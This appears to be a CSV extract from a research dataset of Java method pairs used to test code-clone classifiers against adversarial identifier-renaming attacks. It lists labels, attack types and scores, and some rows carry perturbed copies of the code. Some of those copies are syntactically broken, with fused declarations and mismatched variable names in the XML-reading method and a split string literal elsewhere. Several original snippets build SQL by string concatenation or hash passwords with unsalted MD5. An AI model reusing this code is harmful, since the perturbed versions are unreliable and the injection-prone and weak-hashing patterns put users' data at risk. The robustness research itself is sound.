",78,,LABEL_0,LABEL_0,LABEL_0,-1,"getMD5,source,tmp,md",,,,0,,0,GA,1190,0.4211654345194499,failed,[]
256,"    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String selectedPage = request.getParameter(""SelectedPage"");
        Page page = null;
        PortalRequest portalRequest = PortalRequest.getCurrentRequest();
        if (selectedPage == null) {
            try {
                Property pageProp = Property.getProperty(""HomePage"");
                selectedPage = pageProp.getValue();
            } catch (PersistentModelException e) {
                myLogger.info(""Page could not be found due to an exception"");
                response.sendError(response.SC_NOT_FOUND);
                return;
            }
        }
        myLogger.info(""Handling Page Request for Page "" + selectedPage);
        try {
            if (page == null) {
                try {
                    page = Page.getPage(Long.parseLong(selectedPage));
                } catch (NumberFormatException e) {
                    List<Page> possiblePage = Page.findByName(selectedPage);
                    if (possiblePage.size() > 0) {
                        page = possiblePage.get(0);
                    } else {
                        response.sendError(response.SC_NOT_FOUND);
                        return;
                    }
                }
            }
            if (!page.isVisibleTo(portalRequest.getCurrentUser())) {
                Property pageProp = Property.getProperty(""HomePage"");
                selectedPage = pageProp.getValue();
                page = Page.getPage(Long.parseLong(selectedPage));
            }
            try {
                Property property = Property.getProperty(""LogPageRequests"");
                if (property.getValue().toLowerCase().equals(""true"")) {
                    String referer = request.getHeader(""Referer"");
                    if (referer == null || referer.indexOf(portalRequest.getRequest().getServerName()) > 0) {
                        referer = "" "";
                    } else {
                        if (referer.length() >= 200) {
                            referer = referer.substring(0, 198);
                        }
                    }
                    PageRequest.createRequest(portalRequest.getCurrentHREF(), page, portalRequest.getCurrentUser(), portalRequest.getRequest().getRemoteAddr(), referer);
                }
            } catch (PersistentModelException e) {
                myLogger.log(Level.WARNING, ""Log Page Requests property was not found."", e);
            }
            if (page.isVisibleTo(portalRequest.getCurrentUser())) {
                HttpSession session = request.getSession();
                if (session != null) {
                    RecentlyViewedManager rvm = (RecentlyViewedManager) session.getAttribute(""ipoint.RecentlyViewedManager"");
                    if (rvm == null) {
                        rvm = new RecentlyViewedManager();
                    }
                    rvm.add(page);
                    session.setAttribute(""ipoint.RecentlyViewedManager"", rvm);
                }
                PageCacheEntry entry = null;
                if (!portalRequest.isPost() && !page.isEditableBy(portalRequest.getCurrentUser())) {
                    try {
                        int pageCacheTime = 60000;
                        try {
                            Property pageCacheTimeProperty = Property.getProperty(""PageCacheTime"");
                            pageCacheTime = Integer.parseInt(pageCacheTimeProperty.getValue());
                            pageCacheTime *= 1000;
                        } catch (PersistentModelException pme) {
                            myLogger.warning(""Ignoring Exception when retrieving PageCacheTime property"");
                        } catch (NumberFormatException nfe) {
                        }
                        entry = PageCacheEntry.find(portalRequest.getCurrentHREF(), page, portalRequest.getCurrentUser(), pageCacheTime);
                    } catch (PersistentModelException e) {
                        myLogger.log(Level.WARNING, ""An error occurred finding a page cache entry"", e);
                    }
                }
                response.setContentType(""text/html"");
                response.setHeader(""Cache-Control"", ""no-cache"");
                boolean processed = false;
                if (entry != null) {
                    String tempFile = entry.getTempFile();
                    File file = new File(tempFile);
                    if (file.exists() && file.isFile() && file.canRead()) {
                        FileReader reader = new FileReader(file);
                        BufferedReader br = new BufferedReader(reader);
                        PrintWriter out = response.getWriter();
                        out.write(""<!-- Starting to output cached page in "" + portalRequest.elapsedTime() + "" ms -->\n"");
                        while (br.ready()) {
                            out.write(br.readLine() + ""\n"");
                        }
                        out.write(""<!-- Cached output produced in "" + portalRequest.elapsedTime() + "" ms -->\n"");
                        reader.close();
                        processed = true;
                        portalRequest.getMBeans().incrementStatistics(ManagementMBeans.StatisticsType.PageTotal, page.getName() + ""-"" + page.getID(), portalRequest.elapsedTime(), true);
                    } else {
                        entry.delete();
                    }
                }
                if (!processed) {
                    PrintWriter out = response.getWriter();
                    out.write(""<!-- Output produced by iPoint Portal -->\n"");
                    PageRenderer renderer = new PageRenderer(page);
                    long startTime = System.currentTimeMillis();
                    request.setAttribute(ELConstants.IPOINT_USER, portalRequest.getCurrentUser());
                    request.setAttribute(ELConstants.IPOINT_PAGE, page);
                    request.setAttribute(ELConstants.IPOINT_TEMPLATE, page.getTemplate());
                    request.setAttribute(ELConstants.IPOINT_PORTAL_PROPERTIES, Property.getPropertiesMap());
                    request.setAttribute(ELConstants.IPOINT_USER_PROPERTIES, portalRequest.getCurrentUser().getProperties());
                    renderer.preProcess();
                    portalRequest.getMBeans().incrementStatistics(ManagementMBeans.StatisticsType.PagePreProcess, page.getName() + ""-"" + page.getID(), System.currentTimeMillis() - startTime, false);
                    long renderStart = System.currentTimeMillis();
                    renderer.render();
                    portalRequest.getMBeans().incrementStatistics(ManagementMBeans.StatisticsType.PageRender, page.getName() + ""-"" + page.getID(), System.currentTimeMillis() - renderStart, false);
                    portalRequest.getMBeans().incrementStatistics(ManagementMBeans.StatisticsType.PageTotal, page.getName() + ""-"" + page.getID(), System.currentTimeMillis() - startTime, false);
                    out.write(""<!-- output produced in "" + PortalRequest.getCurrentRequest().elapsedTime() + "" ms -->\n"");
                    if (!page.isEditableBy(portalRequest.getCurrentUser())) {
                        if (response instanceof CachingResponseWrapper) {
                            CachingResponseWrapper crw = (CachingResponseWrapper) response;
                            crw.flushBuffer();
                            Property tempProperty = Property.getProperty(""UploadLocation"");
                            File tempDirectory = new File(tempProperty.getValue());
                            if (tempDirectory.exists() && tempDirectory.canWrite()) {
                                File file = File.createTempFile(""iPointPage"", "".html"", tempDirectory);
                                try {
                                    FileWriter fw = new FileWriter(file);
                                    fw.write(crw.getOutput());
                                    fw.flush();
                                    fw.close();
                                    PageCacheEntry.create(portalRequest.getCurrentHREF(), page, portalRequest.getCurrentUser(), file.getAbsolutePath());
                                } catch (IOException e) {
                                }
                            } else {
                                myLogger.warning(""Can not write to directory "" + tempProperty.getValue());
                            }
                        }
                    }
                }
            } else {
                myLogger.info(""Current User is Forbidden from seeing this Page"");
                response.sendError(response.SC_FORBIDDEN);
            }
        } catch (PersistentModelException e) {
            myLogger.log(Level.INFO, ""Unable to find page "" + selectedPage, e);
            response.sendError(response.SC_NOT_FOUND);
        } catch (PresentationException pe) {
            pe.printStackTrace();
            throw new ServletException(""Error processing the page"", pe);
        }
    }
 <SPLIT>     public static boolean copyTextFile(File src, File dst) {
        try {
            BufferedInputStream bis = new BufferedInputStream(new FileInputStream(src));
            BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(dst));
            byte[] buf = new byte[1024];
            int readsize = 0;
            while ((readsize = bis.read(buf)) != -1) {
                bos.write(buf, 0, readsize);
            }
            bos.flush();
            bos.close();
            bis.close();
        } catch (IOException e) {
            ServerConsoleServlet.printSystemLog(e.toString() + "" "" + e.getMessage(), ServerConsoleServlet.LOG_ERROR);
            return false;
        }
        return true;
    }
",1387,,LABEL_1,LABEL_0,,-4,"doGet,request,response,selectedPage,page,portalRequest,pageProp,possiblePage,property,referer,e",,,,0,,0,Greedy,1,0.0012882192929585775,,[]
257,"        public HttpResponseExchange execute() throws Exception {
            HttpResponseExchange forwardResponse = null;
            int fetchSizeLimit = Config.getInstance().getFetchLimitSize();
            while (null != lastContentRange) {
                forwardRequest.setBody(new byte[0]);
                ContentRangeHeaderValue old = lastContentRange;
                long sendSize = fetchSizeLimit;
                if (old.getInstanceLength() - old.getLastBytePos() - 1 < fetchSizeLimit) {
                    sendSize = (old.getInstanceLength() - old.getLastBytePos() - 1);
                }
                if (sendSize <= 0) {
                    break;
                }
                lastContentRange = new ContentRangeHeaderValue(old.getLastBytePos() + 1, old.getLastBytePos() + sendSize, old.getInstanceLength());
                forwardRequest.setHeader(HttpHeaders.Names.CONTENT_RANGE, lastContentRange);
                forwardRequest.setHeader(HttpHeaders.Names.CONTENT_LENGTH, String.valueOf(sendSize));
                forwardResponse = syncFetch(forwardRequest);
                if (sendSize < fetchSizeLimit) {
                    lastContentRange = null;
                }
            }
            return forwardResponse;
        }
 <SPLIT>     private void generateDeviceUUID() {
        try {
            MessageDigest md5 = MessageDigest.getInstance(""MD5"");
            md5.update(deviceType.getBytes());
            md5.update(internalId.getBytes());
            md5.update(bindAddress.getHostName().getBytes());
            StringBuffer hexString = new StringBuffer();
            byte[] digest = md5.digest();
            for (int i = 0; i < digest.length; i++) {
                hexString.append(Integer.toHexString(0xFF & digest[i]));
            }
            uuid = hexString.toString().toUpperCase();
        } catch (Exception ex) {
            RuntimeException runTimeEx = new RuntimeException(""Unexpected error during MD5 hash creation, check your JRE"");
            runTimeEx.initCause(ex);
            throw runTimeEx;
        }
    }
",187,,LABEL_0,LABEL_0,LABEL_0,-1,"execute,forwardResponse,fetchSizeLimit,lastContentRange,old,sendSize",,,,0,,0,GA,2260,0.8207679629325867,failed,[]
258,"    public void readScalarpvviewerDocument(URL url) {
        try {
            String xmlData = """";
            BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
            String line = """";
            boolean cont = true;
            while (cont) {
                line = in.readLine();
                if (line == null) {
                    break;
                }
                line = line.trim();
                if (line.length() > 0 && line.charAt(0) != '%') {
                    xmlData = xmlData + line + System.getProperty(""line.separator"");
                }
                if (line.length() > 1 && line.charAt(0) == '%' && line.charAt(1) == '=') {
                    cont = false;
                }
            }
            XmlDataAdaptor readAdp = null;
            readAdp = XmlDataAdaptor.adaptorForString(xmlData, false);
            if (readAdp != null) {
                XmlDataAdaptor scalarpvviewerData_Adaptor = readAdp.childAdaptor(dataRootName);
                if (scalarpvviewerData_Adaptor != null) {
                    cleanUp();
                    setTitle(scalarpvviewerData_Adaptor.stringValue(""title""));
                    XmlDataAdaptor params_font = scalarpvviewerData_Adaptor.childAdaptor(""font"");
                    int font_size = params_font.intValue(""size"");
                    int style = params_font.intValue(""style"");
                    String font_Family = params_font.stringValue(""name"");
                    globalFont = new Font(font_Family, style, font_size);
                    fontSize_PrefPanel_Spinner.setValue(new Integer(font_size));
                    setFontForAll(globalFont);
                    XmlDataAdaptor params_pts = scalarpvviewerData_Adaptor.childAdaptor(""Panels_titles"");
                    viewValuesPanel.setTitle(params_pts.stringValue(""values_panel_title""));
                    viewChartsPanel.setTitle(params_pts.stringValue(""charts_panel_title""));
                    XmlDataAdaptor params_data = scalarpvviewerData_Adaptor.childAdaptor(""PARAMETERS"");
                    if (params_data != null) {
                        viewValuesPanel.setLastMemorizingTime(params_data.stringValue(""lastMemorizingTime""));
                    } else {
                        viewValuesPanel.setLastMemorizingTime(""No Info. See time of file modification."");
                    }
                    XmlDataAdaptor params_uc = scalarpvviewerData_Adaptor.childAdaptor(""UpdateController"");
                    double updateTime = params_uc.doubleValue(""updateTime"");
                    updatingController.setUpdateTime(updateTime);
                    double chartUpdateTime = params_uc.doubleValue(""ChartUpdateTime"");
                    viewChartsPanel.setTimeStep(chartUpdateTime);
                    viewValuesPanel.listenModeOn(params_uc.booleanValue(""listenToEPICS""));
                    viewChartsPanel.recordOn(params_uc.booleanValue(""recordChartFromEPICS""));
                    java.util.Iterator<XmlDataAdaptor> pvIt = scalarpvviewerData_Adaptor.childAdaptorIterator(""ScalarPV"");
                    while (pvIt.hasNext()) {
                        XmlDataAdaptor pvDA = pvIt.next();
                        String pvName = pvDA.stringValue(""pvName"");
                        double refVal = pvDA.doubleValue(""referenceValue"");
                        double val = 0.;
                        if (pvDA.hasAttribute(""value"")) {
                            val = pvDA.doubleValue(""value"");
                        }
                        spvs.addScalarPV(pvName, refVal);
                        ScalarPV spv = spvs.getScalarPV(spvs.getSize() - 1);
                        spv.setValue(val);
                        spv.showValueChart(pvDA.booleanValue(""showValueChart""));
                        spv.showRefChart(pvDA.booleanValue(""showRefChart""));
                        spv.showDifChart(pvDA.booleanValue(""showDifChart""));
                        spv.showDif(pvDA.booleanValue(""showDif""));
                        spv.showValue(pvDA.booleanValue(""showValue""));
                        spv.showRef(pvDA.booleanValue(""showRef""));
                    }
                }
            }
            spvs.readChart(in);
            in.close();
            updatingController.setStop(false);
            viewValuesPanel.updateGraph();
            viewChartsPanel.updateGraph();
        } catch (IOException exception) {
            messageTextLocal.setText(null);
            messageTextLocal.setText(""Fatal error. Something wrong with input file. Stop."");
        }
    }
 <SPLIT>     public void add(String language, String tag, String root, String surface) throws FidoDatabaseException, MorphologyTagNotFoundException {
        try {
            Connection conn = null;
            Statement stmt = null;
            try {
                conn = FidoDataSource.getConnection();
                conn.setAutoCommit(false);
                stmt = conn.createStatement();
                if (containsTag(stmt, tag) == false) throw new MorphologyTagNotFoundException(tag);
                if (isRuleUnique(stmt, language, tag, root, surface) == false) return;
                int row;
                if (root.equals(""*"") == true) row = getAppendRowForTag(stmt, language, tag); else if (root.indexOf('*') == -1) row = getFirstRowForTag(stmt, language, tag); else row = getFirstRegularFormForTag(stmt, language, tag);
                boolean use = determineRecognitionUse(root, surface);
                bumpAllRowsDown(stmt, language, tag, row);
                String sql = ""insert into LanguageMorphologies (LanguageName, Rank, Root, Surface, MorphologyTag, Used) "" + ""values ('"" + language + ""', "" + row + "", '"" + root + ""', '"" + surface + ""', '"" + tag + ""', "";
                if (use == true) sql = sql + ""TRUE)""; else sql = sql + ""FALSE)"";
                stmt.executeUpdate(sql);
                conn.commit();
            } catch (SQLException e) {
                if (conn != null) conn.rollback();
                throw e;
            } finally {
                if (stmt != null) stmt.close();
                if (conn != null) conn.close();
            }
        } catch (SQLException e) {
            throw new FidoDatabaseException(e);
        }
    }
",709,"    public void readScalarpvviewerDocument(URL file) {
        try {
            String xmlText = """";
            BufferedReader iin= new BufferedReader(new InputStreamReader(file.openStream()));
            String line = """";
            boolean cont = true;
            while (cont) {
                line = in.readLine();
                if (line == null) {
                    break;
                }
                line = line.trim();
                if (line.length() > 0 && line.charAt(0) != '%') {
                    xmlText = xmlText + line + System.getProperty(""line.separator"");
                }
                if (line.length() > 1 && line.charAt(0) == '%' && line.charAt(1) == '=') {
                    cont = false;
                }
            }
            XmlDataAdaptor readAdp = null;
            readAdp = XmlDataAdaptor.adaptorForString(xmlText, false);
            if (readAdp != null) {
                XmlDataAdaptor scalarpvviewerData_Adaptractor = readAdp.childAdaptor(dataRootName);
                if (scalarpvviewerData_Adaptractor != null) {
                    cleanUp();
                    setTitle(scalarpvviewerData_Adaptractor.stringValue(""title""));
                    XmlDataAdaptor paraparams_fontcalarpvviewerData_Adaptractor.childAdaptor(""font"");
                    int font_size = params_font.intValue(""size"");
                    int style = params_font.intValue(""style"");
                    String fontingStyle = params_font.stringValue(""name"");
                    gglobalFont= new Font(fontingStyle, style, font_size);
                    fontSize_PrefPanel_Spinner.setValue(new Integer(font_size));
                    setFontForAll(globalFont);
                    XmlDataAdaptor paraparams_ptscalarpvviewerData_Adaptractor.childAdaptor(""Panels_titles"");
                    viewValuesPanel.setTitle(params_pts.stringValue(""values_panel_title""));
                    viewChartsPanel.setTitle(params_pts.stringValue(""charts_panel_title""));
                    XmlDataAdaptor paraparams_datacalarpvviewerData_Adaptractor.childAdaptor(""PARAMETERS"");
                    if (params_data != null) {
                        viewValuesPanel.setLastMemorizingTime(params_data.stringValue(""lastMemorizingTime""));
                    } else {
                        viewValuesPanel.setLastMemorizingTime(""No Info. See time of file modification."");
                    }
                    XmlDataAdaptor params_uc = scalarpvviewerData_Adaptractor.childAdaptor(""UpdateController"");
                    double updateTime = params_uc.doubleValue(""updateTime"");
                    updatingController.setUpdateTime(updateTime);
                    double chartUpdateTime = params_uc.doubleValue(""ChartUpdateTime"");
                    viewChartsPanel.setTimeStep(chartUpdateTime);
                    viewValuesPanel.listenModeOn(params_uc.booleanValue(""listenToEPICS""));
                    viewChartsPanel.recordOn(params_uc.booleanValue(""recordChartFromEPICS""));
                    java.util.Iterator<XmlDataAdaptor> pvIt = scalarpvviewerData_Adaptractor.childAdaptorIterator(""ScalarPV"");
                    while (pvIt.hasNext()) {
                        XmlDataAdaptor pvDA = pvIt.next();
                        String pvName = pvDA.stringValue(""pvName"");
                        double refVal = pvDA.doubleValue(""referenceValue"");
                        double val = 0.;
                        if (pvDA.hasAttribute(""value"")) {
                            val = pvDA.doubleValue(""value"");
                        }
                        spvs.addScalarPV(pvName, refVal);
                        ScalarPV spv = spvs.getScalarPV(spvs.getSize() - 1);
                        spv.setValue(val);
                        spv.showValueChart(pvDA.booleanValue(""showValueChart""));
                        spv.showRefChart(pvDA.booleanValue(""showRefChart""));
                        spv.showDifChart(pvDA.booleanValue(""showDifChart""));
                        spv.showDif(pvDA.booleanValue(""showDif""));
                        spv.showValue(pvDA.booleanValue(""showValue""));
                        spv.showRef(pvDA.booleanValue(""showRef""));
                    }
                }
            }
            spvs.readChart(in);
            in.close();
            updatingController.setStop(false);
            viewValuesPanel.updateGraph();
            viewChartsPanel.updateGraph();
        } catch (IOException exception) {
            messageTextLocal.setText(null);
            messageTextLocal.setText(""Fatal error. Something wrong with input file. Stop."");
        }
    }
",LABEL_0,LABEL_0,0.6047331690788269,1,"readScalarpvviewerDocument,url,xmlData,in,line,cont,readAdp,scalarpvviewerData_Adaptor,params_font,font_size,style,font_Family,globalFont,params_pts,params_data",,,,41,"readScalarpvviewerDocument:readScalarpvviewerDocument,url:file,xmlData:xmlText,in:in,line:line,cont:cont,readAdp:readAdp,scalarpvviewerData_Adaptor:scalarpvviewerData_Adaptractor,params_font:params_font,font_size:font_size,style:style,font_Family:fontingStyle,globalFont:globalFont,params_pts:params_pts,params_data:params_data,",11,GA,651,0.2740750869115194,ga,[]
259,"    public static void copy(String fileFrom, String fileTo) throws IOException {
        FileInputStream inputStream = null;
        FileOutputStream outputStream = null;
        FileChannel inputChannel = null;
        FileChannel outputChannel = null;
        try {
            inputStream = new FileInputStream(fileFrom);
            outputStream = new FileOutputStream(fileTo);
            inputChannel = inputStream.getChannel();
            outputChannel = outputStream.getChannel();
            inputChannel.transferTo(0, inputChannel.size(), outputChannel);
        } finally {
            try {
                inputChannel.close();
            } finally {
                try {
                    outputChannel.close();
                } finally {
                    try {
                        inputStream.close();
                    } finally {
                        outputStream.close();
                    }
                }
            }
        }
    }
 <SPLIT>     public void patch() throws IOException {
        if (mods.isEmpty()) {
            return;
        }
        IOUtils.copy(new FileInputStream(Paths.getMinecraftJarPath()), new FileOutputStream(new File(Paths.getMinecraftBackupPath())));
        JarFile mcjar = new JarFile(Paths.getMinecraftJarPath());
    }
",131,,LABEL_1,LABEL_1,LABEL_1,-1,"copy,fileFrom,fileTo,inputStream,outputStream,inputChannel,outputChannel",,,,0,,0,GA,2418,0.8565102299054463,failed,[]
260,"    public void init() {
        String filename = getParameter(""filename"");
        if (filename == null) {
            Error(""Illegal filename"");
            return;
        }
        Dimension dim = DEFAULT_SIZE;
        try {
            int w = Integer.parseInt(getParameter(""width""));
            int h = Integer.parseInt(getParameter(""height""));
            dim = new Dimension(w, h);
        } catch (Exception e) {
        }
        InputStream in;
        try {
            File ff = new File(filename);
            in = new FileInputStream(ff);
        } catch (Exception ignore) {
            try {
                URL url = new URL(filename);
                in = url.openStream();
            } catch (Exception e) {
                Error(""Graph viewer: Failed to open: "" + filename + ""\n"" + e);
                return;
            }
        }
        getContentPane().add(getWindow(in));
        resize(dim);
        repaint();
    }
 <SPLIT>     public static void copyFile(File in, File out) throws IOException {
        FileChannel inChannel = new FileInputStream(in).getChannel();
        FileChannel outChannel = new FileOutputStream(out).getChannel();
        try {
            inChannel.transferTo(0, inChannel.size(), outChannel);
        } catch (IOException e) {
            throw e;
        } finally {
            if (inChannel != null) inChannel.close();
            if (outChannel != null) outChannel.close();
        }
    }
",185,"    public void init() {
        String filename = getParameter(""filename"");
        if (filename == null) {
            Error(""Illegal filename"");
            return;
        }
        Dimension dim = DEFAULT_SIZE;
        try {
            int m = Integer.parseInt(getParameter(""width""));
            int sh = Integer.parseInt(getParameter(""height""));
            dim = new Dimension(m, sh);
        } catch (Exception e) {
        }
        InputStream in;
        try {
            File ff = new File(filename);
            in = new FileInputStream(ff);
        } catch (Exception ignore) {
            try {
                URL io = new URL(filename);
                in = io.openStream();
            } catch (Exception e) {
                Error(""Graph viewer: Failed to open: "" + filename + ""
"" + e);
                return;
            }
        }
        getContentPane().add(getWindow(in));
        resize(dim);
        repaint();
    }
",LABEL_0,LABEL_0,0.5379841923713684,1,"init,filename,dim,w,h,in,ff,url",,,,17,"init:init,filename:filename,dim:dim,w:m,h:sh,in:in,ff:ff,url:io,",5,GA,420,0.15181944767634073,ga,[]
261,"    public Reader getGETReader_bak(URL url) {
        Reader reader = null;
        if (Navigator.isVerbose()) System.out.println(""Web3DService.getGETReader caching "" + url);
        int contentLength = -1;
        URLConnection urlc;
        try {
            urlc = url.openConnection();
            urlc.setReadTimeout(Navigator.TIME_OUT);
            if (getEncoding() != null) {
                urlc.setRequestProperty(""Authorization"", ""Basic "" + getEncoding());
            }
            urlc.connect();
            String content_type = urlc.getContentType();
            if (content_type == null || content_type.equalsIgnoreCase(""x-world/x-vrml"") || content_type.equalsIgnoreCase(""model/vrml"") || content_type.equalsIgnoreCase(""model/vrml;charset=ISO-8859-1"")) {
                InputStream is = urlc.getInputStream();
                DataInputStream d = new DataInputStream(is);
                contentLength = urlc.getContentLength();
                byte[] content = new byte[contentLength];
                if (d != null) {
                    d.readFully(content, 0, contentLength);
                }
                is.close();
                d.close();
                ByteArrayInputStream bais = new ByteArrayInputStream(content);
                reader = new InputStreamReader(bais);
            } else if (content_type.equalsIgnoreCase(""model/vrml.gzip"")) {
                InputStream is = urlc.getInputStream();
                BufferedInputStream bis = new BufferedInputStream(is);
                GZIPInputStream gis = new GZIPInputStream(bis);
                StringBuffer sb = new StringBuffer();
                BufferedReader zipReader = new BufferedReader(new InputStreamReader(gis));
                char chars[] = new char[10240];
                int len = 0;
                contentLength = 0;
                while ((len = zipReader.read(chars, 0, chars.length)) >= 0) {
                    sb.append(chars, 0, len);
                    contentLength += len;
                }
                chars = null;
                gis.close();
                zipReader.close();
                bis.close();
                is.close();
                reader = new StringReader(sb.toString());
            } else if (content_type.equalsIgnoreCase(""model/vrml.encrypted"")) {
                InputStream is = urlc.getInputStream();
                StringBuffer sb = new StringBuffer();
                Cipher pbeCipher = createCipher();
                if (pbeCipher != null) {
                    CipherInputStream cis = new CipherInputStream(is, pbeCipher);
                    BufferedReader bufReader = new BufferedReader(new InputStreamReader(cis));
                    char chars[] = new char[1024];
                    int len = 0;
                    contentLength = 0;
                    while ((len = bufReader.read(chars, 0, chars.length)) >= 0) {
                        sb.append(chars, 0, len);
                        contentLength += len;
                    }
                    chars = null;
                    cis.close();
                    bufReader.close();
                    reader = new StringReader(sb.toString());
                }
            } else if (content_type.equalsIgnoreCase(""model/vrml.gzip.encrypted"")) {
                InputStream is = urlc.getInputStream();
                StringBuffer sb = new StringBuffer();
                Cipher pbeCipher = createCipher();
                if (pbeCipher != null) {
                    CipherInputStream cis = new CipherInputStream(is, pbeCipher);
                    GZIPInputStream gis = new GZIPInputStream(cis);
                    BufferedReader bufReader = new BufferedReader(new InputStreamReader(gis));
                    char chars[] = new char[1024];
                    int len = 0;
                    contentLength = 0;
                    while ((len = bufReader.read(chars, 0, chars.length)) >= 0) {
                        sb.append(chars, 0, len);
                        contentLength += len;
                    }
                    chars = null;
                    bufReader.close();
                    gis.close();
                    cis.close();
                    reader = new StringReader(sb.toString());
                }
            } else if (content_type.equalsIgnoreCase(""text/html;charset=utf-8"")) {
                System.out.println(""text/html;charset=utf-8"");
            } else {
                System.err.println(""ContentNegotiator.startLoading unsupported MIME type: "" + content_type);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return reader;
    }
 <SPLIT>     public static KeyStore createKeyStore(final URL url, final String password) throws KeyStoreException, NoSuchAlgorithmException, CertificateException, IOException {
        if (url == null) throw new IllegalArgumentException(""Keystore url may not be null"");
        LOG.debug(""Initializing key store"");
        KeyStore keystore = null;
        if (url.getFile().endsWith("".p12"")) keystore = KeyStore.getInstance(""pkcs12""); else keystore = KeyStore.getInstance(KeyStore.getDefaultType());
        keystore.load(url.openStream(), password != null ? password.toCharArray() : null);
        return keystore;
    }
",771,,LABEL_0,LABEL_0,LABEL_0,-1,"getGETReader_bak,url,reader,contentLength,urlc,content_type,is,d,content,bais,bis,gis,sb,zipReader,chars,len",,,,0,,0,GA,5788,2.3882940967877704,failed,[]
262,"    private static List<Properties> findExtensions() {
        URL url = null;
        try {
            List<Properties> extensions = new ArrayList<Properties>();
            Enumeration<URL> res = ExtensionHelper.class.getClassLoader().getResources(""logdistiller.properties"");
            while (res.hasMoreElements()) {
                url = res.nextElement();
                Properties prop = new Properties();
                prop.load(url.openStream());
                extensions.add(prop);
            }
            return extensions;
        } catch (IOException ioe) {
            String msg = (url == null) ? ""unable to list resources logdistiller.properties"" : ""unable to load resource "" + url.toExternalForm();
            throw new RuntimeException(msg, ioe);
        }
    }
 <SPLIT>     public synchronized String encrypt(String plainText) {
        String hash = null;
        try {
            MessageDigest md = null;
            try {
                md = MessageDigest.getInstance(""SHA"");
            } catch (NoSuchAlgorithmException e) {
                throw new NoSuchAlgorithmException();
            }
            try {
                if (plainText != null) md.update(plainText.getBytes(""UTF-8""));
            } catch (UnsupportedEncodingException e) {
                throw new UnsupportedEncodingException();
            }
            byte raw[] = md.digest();
            hash = (new BASE64Encoder()).encode(raw);
        } catch (NoSuchAlgorithmException e) {
            MessageLog.writeErrorMessage(e, this);
        } catch (UnsupportedEncodingException e) {
            MessageLog.writeErrorMessage(e, this);
        }
        return Util.stripChars(hash);
    }
",141,,LABEL_0,LABEL_0,LABEL_0,-1,"findExtensions,url,extensions,res,prop,msg",,,,0,,0,GA,2172,0.7804593245188395,failed,[]
263,"    private void updateFile(File file) throws FileNotFoundException, IOException {
        File destFile = new File(file.getPath().replace(URL_UNZIPPED_PREFIX + latestVersion, """"));
        FileChannel in = null;
        FileChannel out = null;
        try {
            if (!destFile.exists()) {
                destFile.getParentFile().mkdirs();
                destFile.createNewFile();
            }
            in = new FileInputStream(file).getChannel();
            out = new FileOutputStream(destFile).getChannel();
            in.transferTo(0, in.size(), out);
        } finally {
            if (out != null) out.close();
            if (in != null) in.close();
        }
    }
 <SPLIT>     public ActionForward execute(ActionMapping mapping, ActionForm form, HttpServletRequest request, HttpServletResponse response) throws Exception {
        InstanciaDelegate delegate = RegistroManager.recuperarInstancia(request);
        if (delegate == null) {
            ActionErrors errors = new ActionErrors();
            errors.add(null, new ActionError(""errors.session""));
            saveErrors(request, errors);
            return mapping.findForward(""fail"");
        }
        AyudaPantalla ayudaPantalla = delegate.obtenerAyudaPantalla();
        TraAyudaPantalla traAyudaPantalla = (TraAyudaPantalla) ayudaPantalla.getTraduccion();
        String urlSonido = traAyudaPantalla.getUrlSonido();
        if (urlSonido == null) {
            return null;
        }
        URL url = new URL(urlSonido);
        URLConnection urlConnection = url.openConnection();
        urlConnection.connect();
        String tipoMime = urlConnection.getContentType();
        log.debug(""Tipo Mime: "" + tipoMime);
        Map audioOptions = new HashMap();
        if (tipoMime.indexOf(""audio"") != -1 || tipoMime.indexOf(""asf"") != -1 || tipoMime.equals(""unknown/unknown"")) {
            audioOptions.put(""id"", ""MediaPlayer"");
            audioOptions.put(""codeBase"", ""http://activex.microsoft.com/activex/controls/mplayer/en/nsmp2inf.cab#Version=6,4,7,1112"");
            audioOptions.put(""classId"", ""CLSID:22D6F312-B0F6-11D0-94AB-0080C74C7E95"");
            audioOptions.put(""mimeType"", ""application/x-mplayer2"");
            audioOptions.put(""urlSonido"", urlSonido);
            audioOptions.put(""pluginSpage"", ""http://www.microsoft.com/Windows/Downloads/Contents/Products/MediaPlayer/"");
        } else if (tipoMime.indexOf(""real"") != -1) {
            audioOptions.put(""id"", ""RVOCX"");
            audioOptions.put(""codeBase"", """");
            audioOptions.put(""classId"", ""clsid:CFCDAA03-8BE4-11cf-B84B-0020AFBBCCFA"");
            audioOptions.put(""mimeType"", ""audio/x-pn-realaudio-plugin"");
            audioOptions.put(""urlSonido"", urlSonido);
            audioOptions.put(""pluginSpage"", """");
        }
        request.setAttribute(""audioOptions"", audioOptions);
        log.debug(""entra success"");
        return mapping.findForward(""success"");
    }
",144,,LABEL_0,LABEL_0,LABEL_0,-1,"updateFile,file,IOException,destFile,in,out",,,,0,,0,GA,2250,0.8336785554885864,failed,[]
264,"    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        if (request.getParameter(""edit"") != null) {
            try {
                User cu = (User) request.getSession().getAttribute(""currentuser"");
                UserDetails ud = cu.getUserDetails();
                String returnTo = ""editprofile.jsp"";
                if (!request.getParameter(""password"").equals("""")) {
                    String password = request.getParameter(""password"");
                    MessageDigest md = MessageDigest.getInstance(""MD5"");
                    md.update(new String(password).getBytes());
                    byte[] hash = md.digest();
                    String pass = new BigInteger(1, hash).toString(16);
                    cu.setClientPassword(pass);
                }
                ud.setFirstName(request.getParameter(""fname""));
                ud.setLastName(request.getParameter(""lname""));
                ud.setEmailAddress(request.getParameter(""email""));
                ud.setAddress(request.getParameter(""address""));
                ud.setZipcode(request.getParameter(""zipcode""));
                ud.setTown(request.getParameter(""town""));
                ud.setCountry(request.getParameter(""country""));
                ud.setTrackingColor(request.getParameter(""input1""));
                String vis = request.getParameter(""visibility"");
                if (vis.equals(""self"")) {
                    cu.setVisibility(0);
                } else if (vis.equals(""friends"")) {
                    cu.setVisibility(1);
                } else if (vis.equals(""all"")) {
                    cu.setVisibility(2);
                } else {
                    response.sendRedirect(""error.jsp?id=8"");
                }
                em.getTransaction().begin();
                em.persist(cu);
                em.getTransaction().commit();
                response.sendRedirect(returnTo);
            } catch (Throwable e) {
                e.printStackTrace();
                response.sendRedirect(""error.jsp?id=5"");
            }
            return;
        }
    }
 <SPLIT>     @Test
    public void testIdentification() {
        try {
            String username = ""muchu"";
            String password = ""123"";
            MessageDigest md5 = MessageDigest.getInstance(""MD5"");
            md5.update(password.getBytes());
